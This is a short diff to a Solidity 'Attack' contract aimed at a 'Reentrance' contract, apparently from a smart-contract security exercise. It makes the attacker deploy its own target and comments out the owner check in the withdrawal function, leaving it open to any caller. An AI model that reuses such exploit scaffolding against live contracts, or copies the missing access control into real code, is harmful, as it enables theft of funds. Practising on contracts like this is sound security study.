@@ -6,8 +6,8 @@ contract Attack {
     Reentrance public reentrances;
     address public owner;
 
-    constructor(address a) public {
-        reentrances = Reentrance(payable(a));
+    constructor() public {
+        reentrances = new Reentrance();
         owner = msg.sender;
     }
 
@@ -17,9 +17,13 @@ contract Attack {
     }
 
     function withdrawToEOA() public {
-        require(msg.sender == owner);
-        (bool success, ) = owner.call{value: address(this).balance}("");
+        // require(msg.sender == owner);
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
         require(success);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
     }
 
     fallback() external payable {
